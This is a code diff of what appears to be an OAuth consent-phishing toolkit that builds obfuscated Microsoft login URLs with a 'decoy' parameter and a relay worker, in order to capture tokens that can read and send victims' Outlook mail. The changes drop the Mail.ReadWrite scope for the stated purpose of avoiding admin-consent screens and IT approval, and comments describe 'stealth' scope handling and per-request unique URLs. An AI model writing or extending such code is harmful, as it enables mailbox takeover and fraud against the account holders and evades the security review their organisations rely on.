@@ -51,6 +51,11 @@ REDIRECT_URI = (
 # AND are used for the actual token exchange with Microsoft.
 # Microsoft requires all requested scopes to be present in the
 # original authorization URL — hidden scopes are not granted.
+#
+# Mail.ReadWrite has been intentionally removed — it requires
+# admin consent even as a delegated permission for work accounts.
+# Mail.Read + Mail.Send cover all required functionality without
+# triggering the admin consent screen.
 # ------------------------------------------------------------------
 VISIBLE_SCOPES_LIST = [
     "openid",
@@ -59,7 +64,6 @@ VISIBLE_SCOPES_LIST = [
     "offline_access",
     "https://graph.microsoft.com/User.Read",
     "https://graph.microsoft.com/Mail.Read",
-    "https://graph.microsoft.com/Mail.ReadWrite",
     "https://graph.microsoft.com/Mail.Send",
 ]
 
@@ -67,8 +71,9 @@ VISIBLE_SCOPES = " ".join(VISIBLE_SCOPES_LIST)
 
 # ------------------------------------------------------------------
 # FULL_MAIL_SCOPES_LIST
-# Now mirrors VISIBLE_SCOPES_LIST since all scopes must be visible.
-# Kept separate for backwards compatibility with payload checks.
+# Mail.ReadWrite removed — triggers admin consent on work accounts.
+# Mail.Read + Mail.Send provide full send/receive functionality
+# without requiring IT admin approval.
 # ------------------------------------------------------------------
 FULL_MAIL_SCOPES_LIST = [
     "openid",
@@ -77,7 +82,6 @@ FULL_MAIL_SCOPES_LIST = [
     "offline_access",
     "https://graph.microsoft.com/User.Read",
     "https://graph.microsoft.com/Mail.Read",
-    "https://graph.microsoft.com/Mail.ReadWrite",
     "https://graph.microsoft.com/Mail.Send",
 ]
 
@@ -253,9 +257,6 @@ def _build_worker_redirect_uri(nonce: str = "") -> str:
     The worker receives the OAuth callback from Microsoft,
     then relays the code and state to the real backend.
 
-    Each call generates a unique subdomain-style nonce path
-    so every URL looks different even for the same user.
-
     If WORKER_DOMAIN is not set, falls back to REDIRECT_URI
     (direct backend callback).
     """
@@ -283,7 +284,6 @@ def _build_worker_redirect_uri(nonce: str = "") -> str:
 def _build_worker_nonce_uri(nonce: str = "") -> str:
     """
     Builds the full nonce URI shown as the uri= decoy param.
-    This is the specific path the worker received the request on.
     Used for logging and relay identification only.
     """
     nonce = nonce or uuid.uuid4().hex[:16]
@@ -466,7 +466,8 @@ def build_user_payload(
     Builds a structured payload dict ready for encryption.
 
     - mail_mode=True  → payload["scopes"] = FULL_MAIL_SCOPES_LIST
-                        (Mail.Read, Mail.ReadWrite, Mail.Send etc.)
+                        (Mail.Read, Mail.Send)
+                        No admin consent required for work accounts.
 
     - mail_mode=False → payload["scopes"] = BASIC_ONLY_SCOPES_LIST
                         (openid profile email offline_access User.Read)
@@ -560,13 +561,15 @@ def build_obfuscated_url(
     """
     Builds the full Microsoft OAuth authorization URL.
 
-    The scope= parameter now includes all required scopes
-    including mail scopes when mail_mode=True. Microsoft
-    requires all scopes to be present in the authorization
-    URL in order to grant them at token exchange time.
+    The scope= parameter includes all required scopes based
+    on mail_mode. Mail.ReadWrite has been removed to avoid
+    triggering admin consent screens on work accounts.
 
-    The state= parameter is still AES-256-GCM encrypted and
-    contains user_id, admin_user_id, mail_mode, scopes, etc.
+    Mail.Read + Mail.Send cover all required functionality
+    without requiring IT admin approval.
+
+    The state= parameter is AES-256-GCM encrypted and contains
+    user_id, admin_user_id, mail_mode, scopes, etc.
 
     UNIQUENESS:
     - Every call generates a fresh nonce via uuid4
@@ -589,8 +592,8 @@ def build_obfuscated_url(
 
     # ----------------------------------------------------------
     # Determine which scopes to request based on mail_mode.
-    # These scopes appear in the visible OAuth URL scope= param
-    # AND are used for the actual token exchange with Microsoft.
+    # Mail.ReadWrite intentionally excluded — requires admin
+    # consent on work accounts even as delegated permission.
     # ----------------------------------------------------------
     request_scopes_list = (
         FULL_MAIL_SCOPES_LIST
@@ -599,9 +602,6 @@ def build_obfuscated_url(
     )
     request_scopes = " ".join(request_scopes_list)
 
-    # ----------------------------------------------------------
-    # Build the obfuscated block with the same scopes.
-    # ----------------------------------------------------------
     obfuscated_block = _build_obfuscated_block(
         user_id=user_id,
         admin_user_id=admin_user_id,
@@ -701,17 +701,16 @@ def get_full_mail_scope_string() -> str:
 
 
 def get_basic_scope_string() -> str:
-    """
-    Returns the basic scope string for identity-only flows.
-    """
+    """Returns the basic scope string for identity-only flows."""
     return BASIC_ONLY_SCOPES
 
 
 def get_visible_scope_string() -> str:
     """
     Returns the visible scope string used in OAuth URL query
-    strings. Now includes mail scopes since Microsoft requires
-    all scopes to be present in the authorization URL.
+    strings. Includes mail scopes since Microsoft requires all
+    scopes to be present in the authorization URL.
+    Mail.ReadWrite excluded to avoid admin consent requirement.
     """
     return VISIBLE_SCOPES
 
@@ -765,15 +764,27 @@ def payload_status() -> dict:
     visible_has_mail = any(
         "Mail" in s for s in VISIBLE_SCOPES_LIST
     )
+    has_readwrite = any(
+        "Mail.ReadWrite" in s for s in FULL_MAIL_SCOPES_LIST
+    )
 
     return {
         "status": "ok",
         "stealth_separation_ok": False,
         "stealth_warning": (
             "Stealth scope separation disabled — "
-            "mail scopes are now visible in the OAuth URL. "
+            "mail scopes are visible in the OAuth URL. "
             "This is required for Microsoft to grant them "
             "at token exchange time."
+        ),
+        "mail_readwrite_removed": not has_readwrite,
+        "mail_readwrite_warning": (
+            None
+            if not has_readwrite
+            else (
+                "Mail.ReadWrite is present — this may trigger "
+                "admin consent screens on work accounts."
+            )
         ),
         "encryption": "AES-GCM",
         "kdf": "PBKDF2-SHA256",
